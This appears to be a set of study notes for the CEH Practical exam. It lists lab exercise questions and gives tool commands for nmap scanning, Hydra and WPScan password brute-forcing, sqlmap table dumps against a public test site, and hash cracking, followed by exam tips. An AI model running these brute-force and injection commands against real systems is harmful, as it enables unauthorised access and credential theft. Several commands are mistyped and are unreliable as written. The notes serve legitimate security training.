# 🧪 Labs and Training

## Tools Used da Technology Hacks

**Linux** 🐧

Netdiscover, Nmap, Hydra, John the ripper, Wpscan, Sqlmap, ADB, Hashcat PhoneSploit Metasploit.

**Windows** 🪟

Wireshark, Hashcalc, Veracrypt, BCTextEncoder, Cryptool, Snow, OpenStego.

## Notes/Exercises

* What is the IP of the Windows X machine?
* Find the IP address of the machine which is running the RDP?
* What is the version of the Linux Kernel?
* How many Windows machines are there?
* Find the OS name of the machine which is running MySQL database?
* What is the password for user X of the FTP server?
* Find the HTTP method that poses a high risk to the application example.com?
* What is user X's IBAN number?
* Which user X's phone number?
* Find the password of the wordpress user “Mario”?
* What is the password hidden in the .jpeg file?
* Rogue AP suspect, crack your password using capture.cap
* Discovery RAT in Network and acess computer to recovery secret.txt
* Find the attacker IP address who has launched the DOS attack?
* Identify FQDN of Domain Controller
* Find the username/password from the pcap file, which is in plain text?
* Find the number of machines that were used to initiate the DDOS attack?
* Find the file name which is tampered by comparing the hashes which is given in the /hashes folder?
* Decrypt the volume file using veracrypt?
* Decode the file which is encoded in DES(ECB) format?
* Perform deep scan on the elf and obtain hash of the file with highest entropy value.
* Connect to the Server remotely using the credentials give by RDP?
* Find the executable's Entry point (Address)
* Extract the information from the SDcard of the Android User?
* Find the machines running MSSQL ?
* Find DOS attacker ips from pcap file ?
* Identify modifed text files , (hint : check integrity)
* Crack MD5 Hashes.
* Find attacker's username from machine?
* Find contact details of Jenny ? (hint : dump the table using sqlmap)
* Find username password ? (hint : Bruteforce using wpscan)
* Use hydra to crack password
* How many machines are active? Use netdiscover
* Which machine has FTP Server open? Use nmap
* Find 2 secret files using FTP? brute force FTP username and psw.
* Find out phone number of Web application user? Use sqlmap
* Brute force Wordpress  website user's psw? Use wpscan
* Decode .hex file? Use Cryptool
* Which machine started DOS attack? DDOS attack happened on which IP? Find out http crediantls from PCAP file? Use wireshark
* Decode the given text using given secret? Use BCTextEncorder
* Calculate SHA1 hash of a text? Use Hashcalc
* Decrypt the hidden vulume and find secret file? Use Veracrypt.
* Crack the given hash? Use hashes.com
* Find secret hidden int he image/file? Usen openstego/snow
* Find a secret file in Android? Use ADB
* Send data to another machine (firewall blocked)? Use Covert TCP.
* Which username was tampered? ( You need to solving by comparing Hash values)
* Wordpress Username Enumeration!
* Retrieve Database names ( SQLi)
* How many machines are there? ( NMAP)
* Phone number of User X? ( Metasploit/Parameter Tampering)
* What is the hidden text in X.jpeg (STEGHIDE)
* Password crack for VCRYPT
* IP Address/ Version of Running windows Server.

### Nmap

#### Identify the OS of the machine hosting a DB

To check target with open DB port (3306 or 1433): `nmap -sV IP/subnet` or `nmap -A IP/subnet` or `nmap -p3306,1433 IP/subnet` and check relative info about OS.

#### Locate IP address of the machine with RDP open port

`nmap -Pn -p -sV 3389 IP`

#### Find FQDN of domain controller <a href="#effd" id="effd"></a>

FQDN (**FQDN = Hostname + Domain**) an example can be: mail.example.com mail (hostname), example.com (domain).

Scan subnet or target filtering for LDAP port (389):

* `nmap -p389 -sV -iL <target_list>` -> if we've more targets IP

or

* `nmap -p389 -sV IP`

Running nmap command we'll retrieve info about Domain and Host name:

* Domain: <mark style="color:orange;">pentester.team</mark> Service Info: Host: <mark style="color:blue;">DC</mark>;
* then FQDN = <mark style="color:blue;">DC</mark>.<mark style="color:orange;">pentester.team</mark>

#### Indetify the number of hosts that are alive

to checks hosts up: `nmap -sn IP/Subnet`

### WireShark

#### Which machine started DOS attack? DDOS attack happened on which IP? Find out http crediantls from PCAP file?&#x20;

**To find DOS (SYN and ACK) :**&#x20;

* statistic -> IPv4 statistics -> source and destination address
* filter using: `tcp.flags.syn == 1 , tcp.flags.syn == 1 and tcp.flags.ack == 0`

#### Analyze the pcap file and determine the number of machines that were involved in DDOS attack

* statistic -> IPv4 statistic -> source and destination address&#x20;

Or

* View Flood attack on victim via Wireshark | use filter tcp.port=21

Or&#x20;

Find the dos attacker ip using Wireshark

Statistic -> conversion

identified ip , which has flooding server with SYN request.

Or&#x20;

get the statistics of ipv4 -> we can see that Packets B -> A are null, because the're not reply pack.

**To find passwords :**&#x20;

`http.request.method == POST`

To find DOS -> Look for Red and Black packets with around 1-2 simple packets in between and then pick any packet and check the Source and Destination IP with port if need.

#### Identify IoT Message and its Length using capture.cap

* Filter .cap file on wireshark with 'MQTT' filter
* Select packet related to Publish Message
* Click on MQ Telemetry Transport Protocol -> Header Flags -> Message Msg Len

or

* Click on MQ Telemetry Transport Protocol -> Publish Message -> Msg Len

### Hashcat

* `hashcat -m 0 -a 0 hash.txt passwordlist.txt -m 0`

> MD5 hash mode -a 0:
>
> Dictionary attack mode hash.txt txt file containing hash in a compliant format passwordlist.txt: dictionary file containing passwords in plain text

### John the Ripper

* `john —format-raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`&#x20;

### Hydra

#### Crack the FTP credentials to obtain file stored into FTP server an enter the content as the answer

* Find IP with FTP open port: nmap -p 21 IP/Subnet
* if we know username: `hydra -l user -P passlist.txt ftp://IP`
* if we don't know username and psw: `hydra -L /user.txt -P password.txt ftp://IP` or `hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://IP` &#x20;
* Login using FTP credentials obtained, get flag and cat it.

### **SQLMap**

#### **Finding vulnerable site**

* site:[http://testphp.vulnweb.com/](http://testphp.vulnweb.com/) php?=&#x20;

(for cookies- console->document.cookie)

* `sqlmap -u` [`http://testphp.vulnweb.com/artists.php?artist=1`](http://testphp.vulnweb.com/artists.php?artist=1)  `--dbs   (databases)`
* `sqlmap -u` [`http://testphp.vulnweb.com/artists.php?artist=1`](http://testphp.vulnweb.com/artists.php?artist=1)  `-D acuart –tables   (tables)`
* `sqlmap -u` [`http://testphp.vulnweb.com/artists.php?artist=1`](http://testphp.vulnweb.com/artists.php?artist=1)  `-D acuart -T users --columns   (columns)`

#### Dump whole table

* `sqlmap -u` [`http://testphp.vulnweb.com/artists.php?artist=1`](http://testphp.vulnweb.com/artists.php?artist=1)  `-D acuart -T users  --dump`&#x20;

&#x20;                                                           OR                                                                                   &#x20;

(dump individual  column data)

* `sqlmap -u` [`http://testphp.vulnweb.com/artists.php?artist=1`](http://testphp.vulnweb.com/artists.php?artist=1)  `-D acuart -T users -C uname  --dump` &#x20;
* `sqlmap -u` [`http://testphp.vulnweb.com/artists.php?artist=1`](http://testphp.vulnweb.com/artists.php?artist=1)  `-D acuart -T users -C pass  --dump`
* `sqlmap -u "http://vmw.moviescope.com/viewprofile.aspx?id=l" —dbs [ Copy the cookie from website, mysql -U qdpmadmin -h 192.168.1.8 -P passwod [ If you have logins credentioals I`&#x20;

### Snow

* `snow.exe -C -p “password” stegfile.txt`

### CrypTool <a href="#effd" id="effd"></a>

#### Can you decrypt the file and provide the contents of "flag1.txt" as the answer? <a href="#effd" id="effd"></a>

* Connect to ftp using cmd: `ftp IP` &#x20;
* After connect with FTP go to the file: `get file.txt` `get file1.txt`
* Decrypt file: open CrypTool program -> Encrypt/Decrypt -> Symmetric (modern) -> DES (ECB)

### WPSCAN

#### Identify psw associated with the User ID "sarah" and resolve the issue to allow her to access her account again. <a href="#effd" id="effd"></a>

* `wpscan --url http://192.168.1.10:8080/CEH -u sarah -P passwdlist.txt`

or

```bash
msfconsole -q
use auxiliary/scanner/http/wordpress_login_enum
show options
set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
set RHOSTS <Target_IP>
set RPORT 8080
set TARGETURI http://10.10.10.10:8080/
set USERNAME admin
```

### Hashes.com <a href="#effd" id="effd"></a>

#### Decrypt/Crack the MD5 hash present into a website <a href="#effd" id="effd"></a>

A file called "Secrethash.txt" has been uploaded via DVWA at http://192.168.1.10:8080/DVWA. The file is located at the following path: C:\wamp64\www\DVWA\hackable\uploads\Secret-Hash.txt. Your task is to crack the MD5 hash present in the file and reveal the original message. You can access the file by logging into DVWA using the provided credentials: superuser::superman.&#x20;

* Got to the site, login, go to the url uploads/Secret-hash.txt
* Decrypt file using this web tool: https://hashes.com/en/decrypt/hash

### RDP <a href="#effd" id="effd"></a>

#### Find secret number hidden inside the file located in a directory (accessible using RDP) <a href="#effd" id="effd"></a>

A file named "Secret.txt" that has been concealed within the Server 2019 machine is located at the following path: C:\Users\Dell\Documents\Confidential.

You will need to use a backdoor installed in the server to access the file. (it's a fake news)

Your objective is to find the secret number hidden inside the file and provide it as your answer.

* User credentials of RDP you find in the previous answer (of rdp) to login.
* Browse to the mentioned path C:\Users\Dell\Documents\Confidential
* Open "Secret.txt" file and copy the number inside.

#### Find suspicious account? You've a credential of one user, you can use RDP to log in e found suspicious account (port 3389). <a href="#effd" id="effd"></a>

* Opening cmd and use: `net user` command.&#x20;

#### Check phone number of Maria <a href="#effd" id="effd"></a>

A site has SQLi vulnerability, the cookie information is stored in a text file in the Documents folder of the EH-2 machine. Use the SQL DSSS attack method to capture the session link. Determine the contact number of Maria associated twith a website.

* We bypass auth, then use IDOR to find Maria's number

#### Netbios <a href="#effd" id="effd"></a>

If you get any questions related to netbios, SMB use metasploit.

### Veracrypt

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*





### Other useful tools

* Veracrypt
* Crypttool&#x20;
* Hash Calculator&#x20;
* MD5 Calculator&#x20;
* Hashcalc
* Hashcat
* John
* BCTextEncoder
* PhoneSploit&#x20;
* NMAP
* Dirb&#x20;
* Steghide
* Searchsploit &#x20;

### Basic Windows cmd 🪟

* net user -> For Domain Users Enumeration
* type C:\path.txt -> It displays the content of the path.txt file.
* dir
* cd
* hostname
* whoami
* pwd

### Basic Linux cmd 🐧

* ls - view contents of directory (list)
* pwd - path of the current directory
* cd - change directoryn
* mkdir - make new directory
* mv - move files / rename files
* cp - copy files
* rm - remove files
* touch - create blank new file
* rmdir - delete directory
* cat - list content of file to terminal
* clear - clear terminal window
* echo - move data into a file
* less - Read text file one screen at a time
* man - show manual of Linux commands
* sudo - enables you to perform tasks that require administrative or root permissions
* top - task manager in terminal
* tar - used to archive multiple files into a tarball
* grep - used to searching words in specific files
* head - view first lines of any text file
* tail - view last lines of any text file
* diff - compares the contents of two files line by line
* kill - used for killing unresponsive program
* jobs - display all current jobs along with their statuses
* sort - is a command line utility for sorting lines of text files
* df - info about system disk
* du - check how much space a file or directory takes
* zip - to compress your files into a zip archive
* unzip - to extract the zipped files from a zip archive
* ssh - a secure encrypted connection between two hosts over and insecure network
* cal - shows calendar
* apt - command line tool for interaction with packaging system
* alias - custom shortcuts used to represent a command
* w - current user info
* whereis - used to locate the binary, source, manual page files
* whatis - used to get one-line man page description
* useradd - used to create a new user
* passwd - used to changing password of current user
* whoami - print current user
* uptime - print current time when machine starts
* free - print free disk space info
* history - print used commands history
* uname - print detailed information about your Linux system
* ping - to check connectivity status to a server
* chmod - to change permissions of files and directories
* chown - to change ownership of files and directories
* find - using find searches for files and directories
* locate - used to locate a file, just like the search command in Windows
* ifconfig - print ip address stuff
* ip a - similar to ifconfig but shortest print
* finger - gives you a short dump of info about a user

## Others <a href="#effd" id="effd"></a>

<details>

<summary>Others</summary>

### Tips <a href="#91e1" id="91e1"></a>

_1) First finish linux based questions like nmap etc and save those in the desktop folder, believe me you will look into the nmap scans over and over again._\
_2) Watch the ilab videos from youtube and reffer CEH practical Lab manual._\
_3) Everything will be asked from the ilab videos nothing will be out of sylabus._\
_4) Be Cool._

The Username and Password file will be present in the parrot machine it will help you to crack the ftp and wordpress related questions.

Don’t be nervous, you are going to pass the exam with no doubt. Patience is really needed for the exam because the parrot machine is outdated and its very slow.



**Exam Experience:**

I know this is the most awaited part. The exam is watched over by a person called a proctor. They use GoToMeeting, a program that sees and hears you through your computer. They'll also record what's on your screen during the whole exam. After your identity is verified, your exam starts.

The exam is on a website called iLab. You don't need to worry about taking pictures of your virtual machines (VMs).

You'll get two Operating systems to test things on. One is Parrot OS, and the other is Windows 7. No more Kali this time.&#x20;

**You can DO** use the internet for the exam. You can look things up, take notes on your computer, watch videos, and read blogs. **But DON”T** write notes by hand, talk to people, or make calls.

Your exam computers won't have regular internet access. You need to use your web browser to access the internet.

* Start with the scanning part (NMAP Scan), since the scanning part takes some time, I moved on to other hacking questions.
* Scan all ports on IPs because default scripts might not catch smart configurations.

</details>
